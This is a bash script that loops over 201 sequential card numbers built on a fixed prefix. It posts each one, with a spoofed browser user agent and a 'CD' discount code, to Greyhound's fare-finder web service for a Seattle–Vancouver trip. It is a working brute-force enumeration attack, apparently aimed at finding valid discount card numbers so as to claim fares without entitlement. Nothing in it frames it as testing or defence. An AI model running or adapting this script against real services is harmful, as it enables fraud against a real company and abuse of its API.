#!/bin/bash


useragent='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'

for i in `seq 123456 123656`; do
  card="4876067890$i"
  data="{'request':{
    '__type':'Greyhound.Website.DataObjects.ClientSearchRequest',
    'Mode':0,
    'Origin':'780780|Seattle/WA',
    'Destination':'730081|Vancouver/BC',
    'Departs':'02 December 2013',
    'Returns':null,
    'TimeDeparts':null,
    'TimeReturns':null,
    'RT':false,
    'Adults':1,
    'Seniors':0,
    'Children':0,
    'PromoCode':'',
    'DiscountCode':'CD',
    'Card':"$card",
    'CardExpiration':'12/2013',
    'FareFinderDatakey':'856cf81e-40da-4ec9-b144-1fa5ebcbfabb'
  }}"
  curl 'https://www.greyhound.com/services/farefinder.asmx/Search' -H "$useragent" -H 'Content-Type: application/json; charset=UTF-8' --data-binary "$data" --compressed
done
